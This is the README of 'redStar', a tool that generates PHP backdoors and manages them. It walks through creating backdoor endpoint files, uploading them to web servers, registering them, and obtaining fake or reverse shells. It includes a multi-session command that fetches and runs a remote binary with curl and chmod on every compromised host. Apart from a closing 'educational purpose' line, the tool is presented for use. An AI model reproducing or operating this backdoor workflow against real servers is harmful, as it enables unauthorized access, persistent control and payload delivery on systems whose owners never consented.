# redStar

redStar is php backdoor generator and management project.

redStar supports autocomplete with [TAB]

## Setup
- pip3 install -r requirements

## Running
- python3 main.py

## Usage
1. Create endpoint
2. upload endpoint to web server
3. add client to redStar
4. have fun


### Create PHP Endpoint File 
createEndpoint 123456 1  => Creates php file in "endpoints" folder
createEndpoint 123456 0  => Creates php file in given path
**OR**
createEndpoint           => Create php file interactive


### Add New Endpoint to redStar
addEndpoint http://localhost/end.php 123456

### Check Avaible Endpoint
checkOnlineSessions

### Execute Commands in All sessions
multiTask "curl http://localhost/test.bin;chmod +x test.bin;./test.bin"

### Get All Sessions
sessions

### Clear Database
clearDB

### Get Fake Shell
sessions 31EAF990D1AB shell

### Get Reverse Shell
sessions 31EAF990D1AB reverseShell

### Delete Session
sessions 31EAF990D1AB delete

### Show Banner
banner


*For Educational Porpuse
